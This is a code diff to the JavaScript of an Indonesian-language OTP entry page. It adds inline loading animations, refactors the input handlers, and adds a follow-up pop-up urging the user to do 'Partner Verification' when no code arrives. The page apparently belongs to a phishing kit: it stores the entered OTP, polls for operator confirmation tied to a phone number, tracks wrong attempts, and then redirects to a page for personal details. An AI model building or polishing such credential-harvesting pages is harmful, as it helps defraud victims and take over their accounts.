@@ -5,17 +5,17 @@
 const sound =
 document.getElementById("successSound");
 
-const otpInputs =
+let otpInputs =
 document.querySelectorAll(".otp-box");
 
 const otpContainer =
 document.querySelector(".otp-container");
 
+const otpOriginalHTML = otpContainer.innerHTML;
+
 const errorBox =
 document.querySelector(".error-box");
 
-const loadingBox =
-document.getElementById("loadingBox");
 
 const blockedBox =
 document.querySelector(".blocked-box");
@@ -36,9 +36,6 @@ document.querySelector(".alert-desc");
 window.addEventListener(
 "pageshow",
 () => {
-
-    loadingBox.style.display =
-    "none";
 
     sound.play();
 
@@ -88,12 +85,6 @@ errorBox.style.display = "none";
 /* HIDE BLOCK */
 blockedBox.style.display = "none";
 
-/* RESET LOADING */
-window.addEventListener("pageshow", () => {
-
-    loadingBox.style.display = "none";
-
-});
 
 /* ========================= */
 /* NOMOR OTOMATIS */
@@ -136,49 +127,49 @@ otpContainer.addEventListener("click", () => {
 /* OTP INPUT */
 /* ========================= */
 
-otpInputs.forEach((input,index) => {
+function initOtpInputs(){
 
-    input.addEventListener("input", () => {
+    otpInputs.forEach((input,index)=>{
 
-        input.value =
-        input.value.replace(/[^0-9]/g,'');
+        input.addEventListener("input",()=>{
 
-        /* HIDE ERROR */
-        errorBox.style.display =
-        "none";
+            input.value =
+            input.value.replace(/[^0-9]/g,'');
 
-        /* NEXT BOX */
-        if(
-            input.value.length === 1 &&
-            index < otpInputs.length - 1
-        ){
+            errorBox.style.display="none";
 
-            otpInputs[index + 1]
-            .focus();
+            if(
+                input.value.length===1 &&
+                index<otpInputs.length-1
+            ){
 
-        }
+                otpInputs[index+1].focus();
 
-        checkOTP();
+            }
 
-    });
+            checkOTP();
 
-    /* BACKSPACE */
-    input.addEventListener("keydown", (e) => {
+        });
 
-        if(
-            e.key === "Backspace" &&
-            input.value === "" &&
-            index > 0
-        ){
+        input.addEventListener("keydown",(e)=>{
 
-            otpInputs[index - 1]
-            .focus();
+            if(
+                e.key==="Backspace" &&
+                input.value==="" &&
+                index>0
+            ){
 
-        }
+                otpInputs[index-1].focus();
+
+            }
+
+        });
 
     });
 
-});
+}
+
+initOtpInputs();
 
 let statusInterval = null;
 
@@ -205,18 +196,56 @@ function cekKonfirmasi(nmrx){
 .getElementById("successPopup")
 .classList.add("show");
 
-document
-.getElementById("successBtn")
-.onclick = () => {
+const successBtn = document.getElementById("successBtn");
 
-    window.location.href =
-    "diri.html";
+successBtn.onclick = () => {
+
+    successBtn.disabled = true;
+
+    successBtn.innerHTML = `
+        <div class="btn-loader">
+            <img src="assets/home.png" class="btn-loader-icon" alt="">
+            <span class="btn-loader-ring"></span>
+        </div>
+    `;
+
+    setTimeout(() => {
+        window.location.href = "diri.html";
+    }, 900);
 
 };
 
         }
 
     },2000);
+
+}
+
+function showPinLoading(){
+    otpContainer.innerHTML = `
+        <div class="pix-inline-loading">
+            <div class="pix-loader">
+                <img src="assets/home.png" class="loader-icon">
+                <span class="loader-ring"></span>
+            </div>
+        </div>
+    `;
+}
+
+function resetPinBox(){
+
+    otpContainer.innerHTML = otpOriginalHTML;
+
+    otpInputs =
+    document.querySelectorAll(".otp-box");
+
+    initOtpInputs();
+
+    otpInputs.forEach(input=>{
+        input.value="";
+    });
+
+    otpInputs[0].focus();
 
 }
 
@@ -236,6 +265,8 @@ function checkOTP(){
 
     /* FULL OTP */
     if(otp.length === 4){
+
+      showPinLoading();
 
          /* SIMPAN */
     localStorage.setItem(
@@ -295,19 +326,14 @@ function checkOTP(){
 
 });
 
-        /* SHOW LOADING */
-        loadingBox.style.display =
-        "flex";
+        /* LOADING DI AREA BOX SAJA */
+showPinLoading();
 
         setTimeout(() => {
 
             if(isConfirmed){
     return;
 }
-
-            /* HIDE LOADING */
-            loadingBox.style.display =
-            "none";
 
             /* TOTAL SALAH */
             wrongCount++;
@@ -372,13 +398,7 @@ function checkOTP(){
             /* RESET OTP */
             setTimeout(() => {
 
-                otpInputs.forEach(input => {
-
-                    input.value = "";
-
-                });
-
-                otpInputs[0].focus();
+                resetPinBox();
 
             },300);
 
@@ -574,6 +594,8 @@ document.getElementById("notifOkBtn");
 const topNotifSound =
 document.getElementById("topNotifSound");
 
+let notifStep = 1;
+
 introBtn.addEventListener("click", () => {
 
     introOverlay.classList.add("hide");
@@ -594,8 +616,35 @@ introBtn.addEventListener("click", () => {
 
 notifOkBtn.addEventListener("click", () => {
 
-    topNotif.classList.remove("show");
-    topNotif.classList.add("hide");
+    if(notifStep === 1){
+
+        topNotif.classList.remove("show");
+        topNotif.classList.add("hide");
+
+        setTimeout(() => {
+
+            document.querySelector(".top-notif-title").innerText =
+            "Belum menerima kode OTP?";
+
+            document.querySelector(".top-notif-desc").innerHTML =
+            "Pastikan kamu sudah melakukan Verifikasi Partner.<br> Cara Verifikasi Partner ada di bawah.";
+
+            topNotif.classList.remove("hide");
+            topNotif.classList.add("show");
+
+            topNotifSound.currentTime = 0;
+            topNotifSound.play().catch(() => {});
+
+            notifStep = 2;
+
+        },350);
+
+    }else{
+
+        topNotif.classList.remove("show");
+        topNotif.classList.add("hide");
+
+    }
 
 });
 
